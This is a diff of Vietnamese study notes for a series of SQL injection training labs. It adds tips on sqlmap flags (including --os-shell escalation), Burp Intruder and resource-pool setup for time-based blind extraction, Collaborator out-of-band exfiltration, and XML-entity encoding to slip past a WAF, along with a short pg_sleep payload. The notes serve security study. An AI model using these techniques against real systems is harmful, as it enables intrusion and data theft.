-  - **Đánh đổi tốc độ:** sleep càng lớn → kết quả càng dễ phân biệt khỏi baseline nhưng attack càng chậm. Có thể giảm sleep xuống mức vừa đủ lớn hơn baseline một khoảng an toàn (VD baseline ~1.3s thì dùng `pg_sleep(5)` là đủ, không cần giữ nguyên 10) — miễn đã single-thread thì sleep ngắn vẫn cho kết quả sạch, giúp giảm đáng kể tổng thời gian chạy so với dùng 10s.
-- **So sánh tốc độ extract dữ liệu giữa các kỹ thuật blind/error**
-  - Boolean-based / Conditional errors: đọc được **1 bit/request** → cần dò từng ký tự bằng Intruder (VD 20 ký tự × 36 giá trị = 720 request)
-  - Visible error-based (CAST): đọc được **nguyên 1 giá trị/request** (toàn bộ chuỗi text lộ ra trong error message) → không cần Intruder brute-force ký tự, nhanh hơn hẳn về số lượng request cần gửi
 
----
+### sqlmap
+- `--technique=U` → UNION-based (Lab 3-10)
+- `--technique=E` → error-based (khi có verbose error như Lab 18)
+- `--technique=B` → boolean blind (Lab 11)
+- `--technique=T` → time-based blind (Lab 13, 14)
+- `--technique=S` → stacked queries (Lab 14 dùng thủ công qua Repeater/Intruder, nhưng về nguyên lý tương ứng kỹ thuật này)
+- `--dbms=oracle`/`--dbms=postgresql`/... → skip bước fingerprint, dùng đúng cú pháp đặc thù DBMS ngay từ đầu (VD `FROM dual`, `ROWNUM` cho Oracle), giảm số request thừa
+- `--risk`, `--level` → tăng độ sâu test (thêm payload, thêm vị trí thử ở header/cookie — hữu ích khi injection point nằm ở cookie như phần lớn lab blind trong chuỗi này)
+- `-r <request_file>` → nạp trực tiếp request đã bắt từ Burp (Repeater) vào sqlmap, giữ nguyên toàn bộ header/cookie thay vì gõ lại tay
+- `--os-shell` → escalate lên RCE nếu quyền DB account cho phép (full impact, bước 4 của Nhánh 3)
 
-## NHÁNH 6 — CÂU HỎI TỰ KIỂM TRA
-1. Vì sao thêm `--` hoặc `#` sau payload lại vô hiệu hóa phần query còn lại thay vì gây lỗi cú pháp?
-2. Vì sao ép kiểu sai bằng `CAST()`/`CONVERT()` có thể biến một lỗ hổng blind SQLi thành visible (error-based)?
-3. Vì sao parameterized query chặn được injection ở **tầng giao thức DB driver**, chứ không phải chỉ "lọc ký tự" ở tầng ứng dụng?
-4. Vì sao chỉ fix error handling (suppress verbose error) là **không đủ** để vá lỗ hổng — injection point còn tồn tại theo hướng nào?
-5. Vì sao UNION-based attack bắt buộc phải xác định đúng **số cột** và **kiểu dữ liệu tương thích** với query gốc trước khi extract data?
-6. Vì sao kỹ thuật `CAST(text AS int)` chỉ hoạt động được nếu ứng dụng **không suppress verbose error message** ở tầng production — và điều đó nói lên gì về mối quan hệ giữa "ẩn lỗi chi tiết" và "vá lỗ hổng SQLi tận gốc"?
-7. Vì sao Visible error-based đọc được nguyên 1 giá trị/request trong khi Boolean-based và Conditional errors chỉ đọc được 1 bit/request — sự khác biệt này nằm ở đâu trong cơ chế oracle của mỗi loại?
-8. Vì sao việc DBMS có tự ép ngầm kiểu dữ liệu (implicit type coercion, VD int→boolean) hay không lại ảnh hưởng trực tiếp tới cú pháp payload CAST — và vì sao không thể áp dụng y nguyên 1 payload CAST giữa các DBMS khác nhau dù cùng ý tưởng khai thác?
-9. Vì sao lỗi cú pháp do gõ nhầm (VD `''` thay vì `'`) có thể tạo ra kết quả 200 OK trông giống hệt như 1 payload hợp lệ thành công — và điều gì buộc bạn phải luôn xác minh ở tầng ký tự thô (Raw), không chỉ tin vào status code?
-10. Vì sao dấu `;` trong payload stacked query bị cắt mất bởi chính tầng Cookie header (không phải do SQL parser) nếu chưa encode thành `%3B` — và tại sao triệu chứng của lỗi này (mọi điều kiện đều phản hồi nhanh như nhau) dễ khiến người mới nhầm là "injection point sai" thay vì "encode sai"?
-11. Vì sao Intruder chạy đa luồng (mặc định) lại phá vỡ độ tin cậy của oracle dạng thời gian, trong khi hoàn toàn không ảnh hưởng gì tới oracle dạng nội dung (`Welcome back`) hay status code — sự khác biệt nằm ở bản chất "tín hiệu" của mỗi loại oracle là gì?
-12. Vì sao time-based blind SQLi được xem là kỹ thuật "cuối cùng" trong thứ tự ưu tiên khai thác (chỉ dùng khi Boolean-based/Error-based đều không khả dụng) — xét trên 2 khía cạnh: tốc độ extract dữ liệu và độ tin cậy của tín hiệu?
-13. Vì sao ngay cả time-based (kỹ thuật "cuối cùng" ở Lab 14) vẫn thất bại khi query được thực thi **bất đồng bộ (async)** so với response — điều gì trong cơ chế đo lường của time-based phụ thuộc vào tính đồng bộ (blocking) này?
-14. Vì sao phải "mượn" 1 lỗ hổng khác (XXE) để tạo ra network call trong SQLi OOB, thay vì DBMS nào cũng có sẵn hàm SQL đơn giản để tự gọi ra ngoài — sự khác biệt về network function build-in giữa Oracle/MSSQL/MySQL/Postgres nói lên điều gì về "bề mặt tấn công" đặc thù của từng DBMS?
-15. Vì sao toán tử nối chuỗi (`||`, `+`, `CONCAT()`) lại là mấu chốt biến 1 OOB interaction "chỉ chứng minh injectable" thành 1 kênh "exfiltrate được dữ liệu thật" — nếu thiếu bước nối chuỗi này, request ra Collaborator còn chứng minh được gì và mất đi khả năng gì?
+### Khi nào nên tự viết script Python thay vì dùng tool có sẵn
+- Cần **binary search** thay vì linear brute-force mặc định của Intruder/sqlmap → giảm số request từ O(n) xuống O(log n) mỗi ký tự (áp dụng được cho cả dò độ dài password lẫn dò từng ký tự ở Lab 11, 12, 14).
+- Payload dạng `CASE WHEN` tùy biến sâu (VD Oracle conditional error ở Lab 12 dùng `ROWNUM` thay `LIMIT`) không khớp pattern chuẩn mà sqlmap tự sinh.
+- Cần custom side-channel mà tool không hỗ trợ sẵn — điển hình là OOB exfiltration ghép dữ liệu vào subdomain qua `||` (Lab 16), cần tự parse kết quả từ Collaborator (Host header) thay vì đọc response HTTP thông thường.
+- Cần tốc độ cao qua request bất đồng bộ/song song có kiểm soát (khác với time-based, nơi *phải* single-thread — xem mục Resource pool bên dưới), hoặc cần filter/sắp xếp lại kết quả theo logic riêng (VD Cluster bomb trả kết quả không theo thứ tự offset số học, cần tự sort lại).
 
----
+### Burp Repeater
+- Dùng để **confirm thủ công từng bước** trước khi đưa vào Intruder: test true/false, trigger error, đo baseline response time — tránh brute-force hàng loạt với payload sai cú pháp (bài học từ mọi lab blind: luôn xác nhận oracle hoạt động đúng cả 2 chiều ở Repeater trước).
+- Luôn kiểm tra tab **Raw** (không phải Pretty) trước khi Send — phát hiện lỗi encode (`;` chưa thành `%3B` — Lab 14), double single-quote (`''` thay vì `'` — Lab 18), hoặc double-encode do bấm Ctrl+U 2 lần.
 
-## LAB TƯƠNG ỨNG THEO NHÁNH 2 (sắp xếp độ khó tăng dần)
+### Burp Intruder
+- **Sniper**: 1 payload position — dò độ dài dữ liệu (`LENGTH(password) > N`, Numbers sequential).
+- **Cluster bomb**: ≥2 payload position độc lập, chạy hết mọi tổ hợp — dò từng ký tự (offset × ký tự thử, VD 20 × 36 = 720 request ở Lab 11/14).
+- Filter kết quả theo:
+  - **Status code** — Conditional errors (Lab 12).
+  - **Response length / Grep-Match keyword** — Conditional responses (Lab 11).
+  - **Response received (thời gian)** — Time-based (Lab 13, 14), cần sort cột này để tìm ranh giới.
 
-**In-band — Retrieve hidden data / Login bypass**
-1. SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
-2. SQL injection vulnerability allowing login bypass
+### Resource pool — bắt buộc cho time-based Intruder
+- **Vì sao cần:** oracle dạng nội dung/status (Lab 11/12) không bị ảnh hưởng khi chạy đa luồng vì mỗi response tự chứa đúng tín hiệu riêng. Nhưng oracle dạng **thời gian** phụ thuộc tài nguyên dùng chung (CPU, connection pool DB) — nhiều request "true" (đang sleep) chạy song song sẽ tranh chấp, khiến các lệnh sleep xếp hàng chồng lên nhau, làm sai lệch phép đo (thực tế Lab 14: dùng `pg_sleep(5)` mặc định đa luồng ra tới 7 dòng ~10.300-10.600ms nhiễu, thay vì 1 ranh giới rõ ràng).
+- **Cách sửa:** tab Resource pool → Create new resource pool → "Maximum concurrent requests" = **1** → gán attack vào pool này.
+- **Đánh đổi tốc độ:** sleep càng lớn càng dễ phân biệt khỏi baseline nhưng attack càng chậm; sau khi đã single-thread, có thể giảm sleep (VD từ 10s xuống 5s) mà kết quả vẫn sạch, miễn khoảng cách với baseline mạng đủ rộng.
 
-**In-band — UNION attack**
-3. SQL injection UNION attack, determining the number of columns returned by the query
-4. SQL injection UNION attack, finding a column containing text
-5. SQL injection UNION attack, retrieving data from other tables
-6. SQL injection UNION attack, retrieving multiple values in a single column
+### So sánh tốc độ extract dữ liệu giữa các kỹ thuật
+| Kỹ thuật | Tốc độ | Lab minh họa |
+|---|---|---|
+| Boolean-based / Conditional errors | 1 bit/request (cần Intruder dò từng ký tự) | Lab 11, 12 |
+| Time-based | 1 bit/request, tốn thêm N giây sleep mỗi request | Lab 13, 14 |
+| Visible error-based | Nguyên 1 giá trị/request | Lab 18 |
+| OOB data exfiltration | Nguyên 1 giá trị/request (qua Collaborator) | Lab 16 |
+| UNION-based | Toàn bộ dữ liệu trong 1 response | Lab 5, 6, 9, 10 |
 
-**Fingerprinting (bổ trợ cho mọi nhánh)**
-7. SQL injection attack, querying the database type and version on Oracle
-8. SQL injection attack, querying the database type and version on MySQL and Microsoft
-9. SQL injection attack, listing the database contents on non-Oracle databases
-10. SQL injection attack, listing the database contents on Oracle
+### Burp Collaborator (bắt buộc Professional)
+- Dùng cho mọi kỹ thuật OOB (Lab 15, 16) — Copy to clipboard lấy subdomain, Insert Collaborator payload để gắn đúng vị trí, Poll now để đọc interaction.
+- **Bẫy cần nhớ:** chỉ bôi đen đúng placeholder text (không lấy kèm `http://` hay `/` xung quanh) trước khi Insert Collaborator payload — bôi sai vùng sẽ làm mất phần cấu trúc quan trọng (scheme, hoặc đoạn subquery nối chuỗi để exfiltrate).
 
-**Error-based**
-11. SQL injection with filter bypass via XML encoding
-12. Visible error-based SQL injection ← *đã hoàn thành (PostgreSQL, xem LAB18_...md)*
-
-**Blind — Conditional responses**
-13. Blind SQL injection with conditional responses ← *đã hoàn thành (xem LAB_11_...md)*
-
-**Blind — Conditional errors**
-14. Blind SQL injection with conditional errors ← *đã hoàn thành (Oracle, xem LAB12_...md)*
-
-**Blind — Time delays**
-15. Blind SQL injection with time delays ← *đã hoàn thành (PostgreSQL, `x'||pg_sleep(10)--`)*
-16. Blind SQL injection with time delays and information retrieval ← *đang thực hiện (PostgreSQL, stacked query + CASE WHEN, xem LAB14_...md)*
-
-**Blind — Out-of-band**
-17. Blind SQL injection with out-of-band interaction
-18. Blind SQL injection with out-of-band data exfiltration ← *đã hoàn thành (Oracle, SQLi+XXE, xem LAB16_...md)*
-
-**Second-order**
-19. Second-order SQL injection
+### Hackvertor (extension, dùng ở Lab 17)
+- Encode payload thành XML character entity (`dec_entities`/`hex_entities`) để bypass WAF pattern-matching mà không đổi bản chất logic payload.
+- Cú pháp tiện lợi `<@hex_entities>...</@hex_entities>` để tự động encode toàn bộ nội dung bên trong ngay trước khi gửi, không cần bôi đen thủ công mỗi lần sửa payload.
